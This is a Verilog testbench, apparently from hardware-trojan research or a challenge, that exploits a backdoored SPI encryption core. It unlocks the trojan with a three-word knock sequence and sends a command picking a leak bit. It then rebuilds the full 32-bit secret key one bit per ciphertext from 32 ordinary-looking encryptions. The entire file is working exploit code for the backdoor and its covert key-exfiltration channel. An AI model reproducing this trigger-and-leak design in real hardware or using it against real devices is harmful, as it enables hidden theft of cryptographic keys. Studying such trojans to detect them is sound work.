`timescale 1ns/1ps
// Exploit: unlock -> send coded instruction -> covert serial key recovery.
module tb_agentic;
  reg SCK=0, RST_N=1, MOSI=0, NORM_CS_N=1, START=0, ENC_DEC=0;
  wire MISO, BUSY, ICE_LED;
  spi_crypto_top dut(.SCK(SCK),.RST_N(RST_N),.MOSI(MOSI),.MISO(MISO),
    .NORM_CS_N(NORM_CS_N),.START(START),.ENC_DEC(ENC_DEC),.BUSY(BUSY),.ICE_LED(ICE_LED));
  localparam T=10;
  localparam [31:0] KEY=32'hA5A5A5A5, KN1=32'h3C8F17A2, KN2=32'h9B216E4D, KN3=32'hF50AC3B9;
  localparam [4:0] LEAK_POS = 5'd7;                 // attacker's choice
  localparam [31:0] CMD = {22'b0, 5'd0, LEAK_POS};  // cadence-1=0 (every op), leak_pos=7
  task tick; begin SCK=1;#(T/2);SCK=0;#(T/2); end endtask
  task do_reset; begin RST_N=0;NORM_CS_N=1;START=0;tick;RST_N=1;tick; end endtask
  task load_word(input [31:0] w); integer i; begin
    NORM_CS_N=0; for(i=31;i>=0;i=i-1) begin MOSI=w[i];tick; end NORM_CS_N=1; end endtask
  task run_engine; integer g; begin START=1;tick;START=0;g=0;
    while(BUSY===1'b1 && g<64) begin tick;g=g+1; end end endtask
  task read_word(output [31:0] w); integer i; begin
    NORM_CS_N=0;w=0; for(i=31;i>=0;i=i-1) begin w[i]=MISO;tick; end NORM_CS_N=1; end endtask
  task enc_op(input [31:0] pt, output [31:0] ct); begin
    ENC_DEC=0; load_word(pt); run_engine; read_word(ct); end endtask

  reg [31:0] ct; reg [31:0] key_recon; integer i;
  initial begin
    $dumpfile("exploit.vcd"); $dumpvars(0,tb_agentic);
    do_reset;
    // normal op
    enc_op(32'h12345678, ct); $display("NORMAL   enc(0x12345678)=0x%08h", ct);
    // STAGE 1: unlock knock
    enc_op(KN1, ct); enc_op(KN2, ct); enc_op(KN3, ct);
    $display("UNLOCK   knock KN1->KN2->KN3 sent");
    // STAGE 2: coded instruction (leak into bit %0d, every op)
    enc_op(CMD, ct);
    $display("COMMAND  sent 0x%08h  -> leak_pos=%0d, cadence=1", CMD, LEAK_POS);
    // STAGE 3: covert serial leak - read 32 ciphertexts, pull bit[LEAK_POS] from each
    key_recon = 0;
    for (i=0;i<32;i=i+1) begin
      enc_op(32'h10000000 + i, ct);           // ordinary-looking traffic
      key_recon[i] = ct[LEAK_POS];            // one key bit hidden per ciphertext
    end
    $display("LEAK     reconstructed key from 32 ciphertexts = 0x%08h", key_recon);
    $display("ACTUAL   embedded key                          = 0x%08h", KEY);
    if (key_recon === KEY) begin
      $display("TROJAN STATUS: TRIGGERED");
      $display("  -> full 32-bit key exfiltrated covertly (1 bit per transaction)");
    end else $display("TROJAN STATUS: reconstruction FAILED");
    $finish;
  end
endmodule
